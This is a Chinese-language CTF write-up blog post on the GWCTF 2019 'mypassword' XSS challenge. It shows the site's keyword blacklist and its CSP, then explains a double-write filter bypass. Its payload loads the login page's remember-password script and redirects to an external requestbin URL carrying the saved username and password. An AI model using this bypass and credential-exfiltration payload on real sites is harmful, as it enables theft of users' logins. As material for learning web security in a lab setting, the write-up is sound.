---
title: "XSS相关"
date: 2020-04-09
description: "记录CTF中遇到的XSS题型"
categories: [
  "CTF"
]
tags: [
  "XSS"
]
---

## [GWCTF 2019]mypassword

- 一通注入，失败，且登陆进去之后提示非注入

- 存在提交反馈页面，同时Header中给出CSP，大概率考察XSS

- 提交页面Ctrl+U，提示源码

  ```php
  <?php
  if(is_array($feedback)){
      echo "<script>alert('反馈不合法');</script>";
      return false;
  }
  $blacklist = ['_','\'','&','\\','#','%','input','script','iframe','host','onload','onerror','srcdoc','location','svg','form','img','src','getElement','document','cookie'];
  foreach ($blacklist as $val) {
      while(true){
          if(stripos($feedback,$val) !== false){
              $feedback = str_ireplace($val,"",$feedback);
          }else{
              break;
          }
      }
  }
  ```

  对`blacklist`中每个元素依次循环过滤，只需将最后的`cookie`插入其他关键字中即可双写绕过

- ```html
  Content-Security-Policy: default-src 'self';script-src 'unsafe-inline' 'self'
  ```

  CSP存在`script-src 'unsafe-inline'`，可以任意执行内联脚本

- 登陆页面存在`记住密码`功能，查看`./js/login.js`

  ```js
  if (document.cookie && document.cookie != '') {
    var cookies = document.cookie.split('; ');
    var cookie = {};
    for (var i = 0; i < cookies.length; i++) {
        var arr = cookies[i].split('=');
        var key = arr[0];
        cookie[key] = arr[1];
    }
    if(typeof(cookie['user']) != "undefined" && typeof(cookie['psw']) != "undefined"){
        document.getElementsByName("username")[0].value = cookie['user'];
        document.getElementsByName("password")[0].value = cookie['psw'];
    }
  }
  ```

  构造XSS取出username和password

- Payload:

  ```HTML
  <inpcookieut type="text" name="username"></inpcookieut>
  <inpcookieut type="text" name="password"></inpcookieut>
  <scricookiept scookierc="./js/login.js"></scricookiept>
  <scricookiept>
    var na = documcookieent.getElemcookieentsByName("username")[0].value;
    var pw = documcookieent.getElemcookieentsByName("password")[0].value;
    documcookieent.locacookietion="http://http.requestbin.buuoj.cn/1iiqfqb1?a="+na+" "+pw;
  </scricookiept>
  ```

  密码即flag

  > 由于CSP`connect-src`留空，默认无法使用fetch或ajax，但允许ducument.location跳转